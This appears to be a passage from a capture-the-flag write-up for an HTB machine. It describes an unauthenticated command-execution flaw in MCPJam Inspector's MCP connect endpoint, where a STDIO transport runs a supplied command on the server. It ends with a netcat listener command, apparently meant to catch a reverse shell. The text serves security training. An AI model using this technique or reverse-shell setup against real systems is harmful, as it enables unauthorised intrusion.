// 03. INITIAL FOOTHOLD — GHSA-232v-j27c-5pp6

Target: https://mcp.kobold.htb/api/mcp/connect

MCPJam Inspector supports two MCP transport types:

  • SSE — connects to remote HTTP server
  • STDIO — spawns a LOCAL process and communicates via stdin/stdout ← vulnerable

The /api/mcp/connect endpoint accepted transportType: stdio with a command field — executing it directly on the server with zero authentication, zero sanitization.

Exploit:

2nc -lvnp 4444
